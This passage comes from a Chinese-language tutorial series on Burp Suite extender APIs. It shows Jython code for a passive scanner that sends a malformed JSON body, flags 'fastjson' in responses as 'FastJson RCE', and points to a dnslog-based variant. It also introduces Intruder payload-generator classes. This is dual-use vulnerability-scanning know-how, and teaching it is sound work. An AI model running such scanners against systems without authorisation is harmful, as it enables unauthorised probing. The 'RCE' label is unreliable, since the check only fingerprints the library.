url</span><br><span class="line">​     self._httpMessages &#x3D; httpMessages</span><br><span class="line">​     self._name &#x3D; name</span><br><span class="line">​     self._detail &#x3D; detail</span><br><span class="line">​     self._severity &#x3D; severity</span><br><span class="line"></span><br><span class="line">   def getUrl(self):</span><br><span class="line">     return self._url</span><br><span class="line"></span><br><span class="line">   def getIssueName(self):</span><br><span class="line">     return self._name</span><br><span class="line"></span><br><span class="line">   def getIssueType(self):</span><br><span class="line">     return 0</span><br><span class="line"></span><br><span class="line">   def getSeverity(self):</span><br><span class="line">     return self._severity</span><br><span class="line"></span><br><span class="line">   def getConfidence(self):</span><br><span class="line">     return &quot;Certain&quot;</span><br><span class="line"></span><br><span class="line">   def getIssueBackground(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getRemediationBackground(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getIssueDetail(self):</span><br><span class="line">     return self._detail</span><br><span class="line"></span><br><span class="line">   def getRemediationDetail(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getHttpMessages(self):</span><br><span class="line">     return self._httpMessages</span><br><span class="line"></span><br><span class="line">   def getHttpService(self):</span><br><span class="line">     return self._httpService</span><br></pre></td></tr></table></figure>
+
+<p>那么这个就是最简单的一个检测注入的被动扫描插件</p>
+<p>效果如下：</p>
+<p>在output输出我们代码里的print内容</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/31.jpg" alt="图片"></p>
+<p>在Scanner的Issue显示漏洞详情，包含数据包等各种内容</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/32.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/33.jpg" alt="图片"></p>
+<p>那么只要你多添加些payload，然后使用多线程去调用就能够实现多线程被动注入检测插件啦！</p>
+<p>当你学到这的时候，恭喜你解放自己的重复劳动力，从今以后挖洞只需要不断的访问链接，漏洞自会不断出现。</p>
+<h1 id="Burp-Extender-Apis-插件开发-（六）"><a href="#Burp-Extender-Apis-插件开发-（六）" class="headerlink" title="Burp Extender Apis 插件开发 （六）"></a>Burp Extender Apis 插件开发 （六）</h1><h3 id="0x01-getContentType"><a href="#0x01-getContentType" class="headerlink" title="0x01 getContentType"></a><em><strong>0x01 getContentType</strong></em></h3><p>此方法用于获取消息正文的内容类型，由IRequestInfo对象调用</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IRequestInfo.html#getContentType()">https://portswigger.net/burp/extender/api/burp/IRequestInfo.html#getContentType()</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/34.jpg" alt="图片"></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reqContentType &#x3D; analyzedRequest.getContentType()</span><br></pre></td></tr></table></figure>
+
+<p>如果数据是json格式，那么analyzedRequest.getContentType()返回来的值是4。</p>
+<p>那么就可以通过reqContentType是否等于4过滤掉不是json格式的数据包，从而使该插件只检测当数据类型是json时才触发。</p>
+<p>接下来准备重构数据包。</p>
+<h3 id="0x02-stringToBytes"><a href="#0x02-stringToBytes" class="headerlink" title="0x02 stringToBytes()"></a><em><strong>0x02 stringToBytes()</strong></em></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] stringToBytes(java.lang.String data)</span><br></pre></td></tr></table></figure>
+
+<p>此方法可用于将数据从字符串形式转换为字节数组。该转换不反映任何特定字符集，十六进制表示为0xWXYZ的字符将始终转换为表示形式为0xYZ的字节。它执行与方法相反的转换bytesToString()，并保证使用这两种方法将基于字节的数据转换为String并再次返回，以确保其完整性（反映给定字符集的转换可能不是这种情况）。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)">https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/35.jpg" alt="图片"></p>
+<p>官方的解释有点拗口，其实很简单，就是把我们想要提交的字符串内容转换为burp能认识的数据类型。</p>
+<p>示例代码如下：将字符串payload转换为burp认识的字节类型，这样newBody的数据类型就变成了byte，就能够在下一个api里使用了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newBodyPayload &#x3D; &#39;&#123;&quot;age&quot;:25, &quot;name&quot;:&quot;Bob&quot;&quot;&#125;&#39;</span><br><span class="line">newBody &#x3D; self._helpers.stringToBytes(newBodyPayload)    # 将字符串转换为字节</span><br></pre></td></tr></table></figure>
+
+<p>当构造好payload后，下面准备重构http消息</p>
+<h3 id="0x03-buildHttpMessage"><a href="#0x03-buildHttpMessage" class="headerlink" title="0x03 buildHttpMessage"></a><em><strong>0x03 buildHttpMessage</strong></em></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] buildHttpMessage(java.util.List&lt;java.lang.String&gt; headers, byte[] body)</span><br></pre></td></tr></table></figure>
+
+<p>此方法构建包含指定的标头和消息正文的HTTP消息。如果适用，将根据正文的长度添加或更新Content-Length标头。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])">https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/36.jpg" alt="图片"></p>
+<p>buildHttpMessage的第一个参数headers是IRequestInfo对象的getHeaders()方法返回值</p>
+<p>示例代码如下：如果不知道analyzedIRequestInfo是什么变量，请回顾前几节课。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reqHeaders &#x3D; analyzedIRequestInfo.getHeaders()</span><br></pre></td></tr></table></figure>
+
+<p>buildHttpMessage的第二个参数body是IExtensionHelpers.stringToBytes(字符串)的返回值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newBody &#x3D; self._helpers.stringToBytes(newBodyPayload) # 将字符串转换为字节</span><br></pre></td></tr></table></figure>
+
+<p>准备好两个参数后，传递给buildHttpMessage即可重构http消息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newRequest &#x3D; self._helpers.buildHttpMessage(reqHeaders, newBody) #  重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。</span><br></pre></td></tr></table></figure>
+
+<p>然后接下来同样使用makeHttpRequest发送数据并响应即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newIHttpRequestResponse &#x3D; self._callbacks.makeHttpRequest(httpService, newRequest) # 发送数据</span><br></pre></td></tr></table></figure>
+
+<p>fastjson rce检测插件demo</p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"># 被动扫描fastjson rce检测</span><br><span class="line">from burp import IBurpExtender, IScannerCheck, IScanIssue, IMessageEditorTabFactory, IContextMenuFactory</span><br><span class="line">from burp import IScanIssue</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory, IScannerCheck):</span><br><span class="line">   def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line">​     # Required for easier debugging:</span><br><span class="line">​     sys.stdout &#x3D; callbacks.getStdout()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。</span><br><span class="line">​     self._callbacks &#x3D; callbacks</span><br><span class="line"></span><br><span class="line">​     # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">​     self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。</span><br><span class="line">​     self._callbacks.setExtensionName(&quot;Passive Fastjson Check&quot;)</span><br><span class="line"></span><br><span class="line">​     # 注册扫描</span><br><span class="line">​     callbacks.registerScannerCheck(self)</span><br><span class="line"></span><br><span class="line">   # 获取请求的url</span><br><span class="line">   def get_request_url(self, protocol, reqHeaders):</span><br><span class="line">     link &#x3D; reqHeaders[0].split(&#39; &#39;)[1]</span><br><span class="line">     host &#x3D; reqHeaders[1].split(&#39; &#39;)[1]</span><br><span class="line">     return protocol + &#39;:&#x2F;&#x2F;&#39; + host + link</span><br><span class="line"></span><br><span class="line">   # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数</span><br><span class="line">   def get_request_info(self, request):</span><br><span class="line">     analyzedIRequestInfo &#x3D; self._helpers.analyzeRequest(request)  #  analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象</span><br><span class="line">     reqHeaders &#x3D; analyzedIRequestInfo.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。</span><br><span class="line">     reqBodys &#x3D; request[analyzedIRequestInfo.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。</span><br><span class="line">     reqMethod &#x3D; analyzedIRequestInfo.getMethod()  # 获取请求方法</span><br><span class="line">     reqParameters &#x3D; analyzedIRequestInfo.getParameters()</span><br><span class="line">     return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters</span><br><span class="line"></span><br><span class="line">   # 获取响应的一些信息：响应头，响应内容，响应状态码</span><br><span class="line">   def get_response_info(self, response):</span><br><span class="line">     analyzedIResponseInfo &#x3D; self._helpers.analyzeRequest(response)  #  analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。</span><br><span class="line">     resHeaders &#x3D; analyzedIResponseInfo.getHeaders()  # getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。</span><br><span class="line">     resBodys &#x3D;  response[analyzedIResponseInfo.getBodyOffset():].tostring()  #  getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。response[analyzedResponse.getBodyOffset():]获取正文内容</span><br><span class="line">     # resStatusCode &#x3D; analyzedIResponseInfo.getStatusCode()  # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。</span><br><span class="line">     return resHeaders, resBodys</span><br><span class="line"></span><br><span class="line">   # 获取服务端的信息，主机地址，端口，协议</span><br><span class="line">   def get_server_info(self, httpService):</span><br><span class="line">     host &#x3D; httpService.getHost()</span><br><span class="line">     port &#x3D; httpService.getPort()</span><br><span class="line">     protocol &#x3D; httpService.getProtocol()</span><br><span class="line">     ishttps &#x3D; False</span><br><span class="line">     if protocol &#x3D;&#x3D; &#39;https&#39;:</span><br><span class="line">       ishttps &#x3D; True</span><br><span class="line">     return host, port, protocol, ishttps</span><br><span class="line"></span><br><span class="line">   # 获取请求的参数名、参数值、参数类型（get、post、cookie-&gt;用来构造参数时使用）</span><br><span class="line">   def get_parameter_Name_Value_Type(self, parameter):</span><br><span class="line">     parameterName &#x3D; parameter.getName()</span><br><span class="line">     parameterValue &#x3D; parameter.getValue()</span><br><span class="line">     parameterType &#x3D; parameter.getType()</span><br><span class="line">     return parameterName, parameterValue, parameterType</span><br><span class="line"></span><br><span class="line">   # 开始检测</span><br><span class="line">   def start_run(self, baseRequestResponse):</span><br><span class="line">     self.baseRequestResponse &#x3D; baseRequestResponse</span><br><span class="line"></span><br><span class="line">​     # 获取请求包的数据</span><br><span class="line">​     request &#x3D; self.baseRequestResponse.getRequest()</span><br><span class="line">​     analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters &#x3D; self.get_request_info(request)</span><br><span class="line">​     reqContentType &#x3D; analyzedRequest.getContentType()    # 获取请求格式，例如json</span><br><span class="line"></span><br><span class="line">​     if reqContentType &#x3D;&#x3D; 4:     # json格式数据</span><br><span class="line"></span><br><span class="line">​       # 获取服务信息</span><br><span class="line">​       httpService &#x3D; self.baseRequestResponse.getHttpService()</span><br><span class="line"></span><br><span class="line">​       newBodyPayload &#x3D; &#39;&#123;&quot;age&quot;:25, &quot;name&quot;:&quot;Bob&quot;&quot;&#125;&#39;</span><br><span class="line">​       newBody &#x3D; self._helpers.stringToBytes(newBodyPayload)    # 将字符串转换为字节  https:&#x2F;&#x2F;portswigger.net&#x2F;burp&#x2F;extender&#x2F;api&#x2F;burp&#x2F;IExtensionHelpers.html#stringToBytes(java.lang.String)</span><br><span class="line">​       newRequest &#x3D; self._helpers.buildHttpMessage(reqHeaders,  newBody)   #  重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。https:&#x2F;&#x2F;portswigger.net&#x2F;burp&#x2F;extender&#x2F;api&#x2F;burp&#x2F;IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])</span><br><span class="line">​       newIHttpRequestResponse &#x3D; self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据</span><br><span class="line">​       response &#x3D; newIHttpRequestResponse.getResponse()  # 获取响应包</span><br><span class="line">​       analyzedIResponseInfo &#x3D;  self._helpers.analyzeRequest(response)  #  analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。</span><br><span class="line">​       resBodys &#x3D; response[analyzedIResponseInfo.getBodyOffset():].tostring()</span><br><span class="line">​       newUrl &#x3D; self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()</span><br><span class="line"></span><br><span class="line">​       print resBodys</span><br><span class="line"></span><br><span class="line">​       if &#39;fastjson&#39; in resBodys:</span><br><span class="line">​         print &#39;[+] &#123;&#125;&#39;.format(newUrl)</span><br><span class="line">​         self.save(newUrl)</span><br><span class="line">​         self.issues.append(CustomScanIssue(</span><br><span class="line">​                 newIHttpRequestResponse.getHttpService(),</span><br><span class="line">​                 newUrl,</span><br><span class="line">​                 [newIHttpRequestResponse],</span><br><span class="line">​                 &quot;FastJson RCE&quot;,</span><br><span class="line">​                 &quot;fastjson&quot;,</span><br><span class="line">​                 &quot;High&quot;))</span><br><span class="line">​       else:</span><br><span class="line">​         print &#39;[-] &#123;&#125;&#39;.format(newUrl)</span><br><span class="line"></span><br><span class="line">   def doPassiveScan(self, baseRequestResponse):</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line">     :param baseRequestResponse: IHttpRequestResponse</span><br><span class="line">     :return:</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line">     self.issues &#x3D; []</span><br><span class="line">     self.start_run(baseRequestResponse)</span><br><span class="line">     return self.issues</span><br><span class="line"></span><br><span class="line">   def consolidateDuplicateIssues(self, existingIssue, newIssue):</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line">     相同的数据包，只报告一份报告</span><br><span class="line">     :param existingIssue:</span><br><span class="line">     :param newIssue:</span><br><span class="line">     :return:</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     if existingIssue.getIssueDetail() &#x3D;&#x3D; newIssue.getIssueDetail():</span><br><span class="line">       return -1</span><br><span class="line"></span><br><span class="line">​     return 0</span><br><span class="line"></span><br><span class="line">class CustomScanIssue(IScanIssue):</span><br><span class="line">   def __init__(self, httpService, url, httpMessages, name, detail, severity):</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">​     :param httpService: HTTP服务</span><br><span class="line">​     :param url: 漏洞url</span><br><span class="line">​     :param httpMessages: HTTP消息</span><br><span class="line">​     :param name: 漏洞名</span><br><span class="line">​     :param detail: 漏洞细节</span><br><span class="line">​     :param severity: 漏洞等级</span><br><span class="line">​     &#39;&#39;&#39;</span><br><span class="line">​     self._httpService &#x3D; httpService</span><br><span class="line">​     self._url &#x3D; url</span><br><span class="line">​     self._httpMessages &#x3D; httpMessages</span><br><span class="line">​     self._name &#x3D; name</span><br><span class="line">​     self._detail &#x3D; detail</span><br><span class="line">​     self._severity &#x3D; severity</span><br><span class="line"></span><br><span class="line">   def getUrl(self):</span><br><span class="line">     return self._url</span><br><span class="line"></span><br><span class="line">   def getIssueName(self):</span><br><span class="line">     return self._name</span><br><span class="line"></span><br><span class="line">   def getIssueType(self):</span><br><span class="line">     return 0</span><br><span class="line"></span><br><span class="line">   def getSeverity(self):</span><br><span class="line">     return self._severity</span><br><span class="line"></span><br><span class="line">   def getConfidence(self):</span><br><span class="line">     return &quot;Certain&quot;</span><br><span class="line"></span><br><span class="line">   def getIssueBackground(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getRemediationBackground(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getIssueDetail(self):</span><br><span class="line">     return self._detail</span><br><span class="line"></span><br><span class="line">   def getRemediationDetail(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getHttpMessages(self):</span><br><span class="line">     return self._httpMessages</span><br><span class="line"></span><br><span class="line">   def getHttpService(self):</span><br><span class="line">     return self._httpService</span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p>当正常发送数据包时，响应包没报错</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/37.jpg" alt="图片"></p>
+<p>再来看看插件的情况，可以看到响应包里出现了fastjon字符串，说明payload检测出了该漏洞</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/38.jpg" alt="图片"></p>
+<p>这里demo用的是写死的payload，自己写的时候根据自己的需求将payload请求的地址改为dnslog的地址。</p>
+<h1 id="Burp-Extender-Apis-插件开发-（第七课）"><a href="#Burp-Extender-Apis-插件开发-（第七课）" class="headerlink" title="Burp Extender Apis 插件开发 （第七课）"></a>Burp Extender Apis 插件开发 （第七课）</h1><h1 id="Burp-Extender-Apis-插件开发-（第八课）"><a href="#Burp-Extender-Apis-插件开发-（第八课）" class="headerlink" title="Burp Extender Apis 插件开发 （第八课）"></a>Burp Extender Apis 插件开发 （第八课）</h1><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a><strong>0x01 前言</strong></h3><p>通过前面课程的学习，已经能够编写注入检测插件，fastjson检测插件。接下来开始尝试编写上传FUZZ插件，这里主要用的模块是Intruder！</p>
+<p>我们先通过intruder的官方例子来学习</p>
+<p><a target="_blank" rel="noopener" href="https://xxx.com/PortSwigger/example-intruder-payloads/blob/44ef0ce70fe53c0b195bb514e38e8a36efbe43b6/python/IntruderPayloads.py">https://xxx.com/PortSwigger/example-intruder-payloads/blob/44ef0ce70fe53c0b195bb514e38e8a36efbe43b6/python/IntruderPayloads.py</a></p>
+<p>代码后面再讲解，先加载该脚本，看看是怎么样的一个功能，这样后面看代码理解的也更快。</p>
+<p>先加载py脚本，加载完后到Intruder模块里，对一个数据包设置多个变量参数</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/39.jpg" alt="图片"></p>
+<p>payloads选择Extension-generated</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/40.jpg" alt="图片"></p>
+<p>select generator的下拉框选择py脚本里设置的名字</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/41.jpg" alt="图片"></p>
+<p>这里记住，如果你脚本里的payload有特殊字符，一定要取消url编码</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/42.jpg" alt="图片"></p>
+<p>start attack后的效果如下，每一个变量参数都会使用py脚本里填写的参数</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/43.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/44.jpg" alt="图片"></p>
+<p>看完官方给的例子演示过程，然后学习所用到的api。这节课先简单学习IIntruderPayloadGeneratorFactory类</p>
+<h3 id="0x02-IIntruderPayloadGeneratorFactory"><a href="#0x02-IIntruderPayloadGeneratorFactory" class="headerlink" title="0x02 IIntruderPayloadGeneratorFactory"></a><strong>0x02 IIntruderPayloadGeneratorFactory</strong></h3><p>扩展程序可以实现此接口，然后调用 IBurpExtenderCallbacks.registerIntruderPayloadGeneratorFactory() 以注册自定义Intruder负载的工厂。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGeneratorFactory.html">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGeneratorFactory.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/45.jpg" alt="图片"></p>
+<p>该类有两个方法：getGeneratorName, createNewInstance</p>
+<h3 id="0x03-getGeneratorName"><a href="#0x03-getGeneratorName" class="headerlink" title="0x03 getGeneratorName"></a><strong>0x03 getGeneratorName</strong></h3><p>Burp使用此方法来获取有效负载生成器的名称。当用户选择使用扩展生成的有效内容时，这将作为选项显示在Intruder UI中。</p>
+<p>返回值：有效负载生成器的名称。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGeneratorFactory.html#getGeneratorName()">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGeneratorFactory.html#getGeneratorName()</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/46.jpg" alt="图片"></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def getGeneratorName(self):   return &quot;My custom payloads&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其实就是设置payload生成器名字，作为选项显示在Intruder UI中。</p>
+<p>效果如下：</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/47.jpg" alt="图片"></p>
+<h3 id="0x04-createNewInstance"><a href="#0x04-createNewInstance" class="headerlink" title="0x04 createNewInstance"></a><em><strong>0x04 createNewInstance</strong></em></h3><p>用户启动使用此有效负载生成器的入侵者攻击时，Burp将使用此方法。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGeneratorFactory.html#createNewInstance(burp.IIntruderAttack)">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGeneratorFactory.html#createNewInstance(burp.IIntruderAttack)</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/48.jpg" alt="图片"></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def createNewInstance(self, attack):</span><br><span class="line">   # return a new IIntruderPayloadGenerator to generate payloads for this attack   return IntruderPayloadGenerator()</span><br></pre></td></tr></table></figure>
+
+<p>其实就是创建payload生成器实例，传入的attack是IIntruderAttack的实例，返回的是IntruderPayloadGenerator的实例</p>
+<p>这节课讲到了createNewInstance方法返回了实例IntruderPayloadGenerator，下节课介绍IntruderPayloadGenerator类：实现Intruder功能的各个方法讲解，并且实现一个简单的Demo。</p>
+<h1 id="Burp-Extender-Apis-插件开发-（第九课）"><a href="#Burp-Extender-Apis-插件开发-（第九课）" class="headerlink" title="Burp Extender Apis 插件开发 （第九课）"></a>Burp Extender Apis 插件开发 （第九课）</h1><h3 id="0x01-前言-1"><a href="#0x01-前言-1" class="headerlink" title="0x01 前言"></a><strong>0x01 前言</strong></h3><p>上节课讲到createNewInstance方法返回了实例IntruderPayloadGenerator，这节课主要学习IntruderPayloadGenerator类，IIntruderPayloadProcessor类</p>
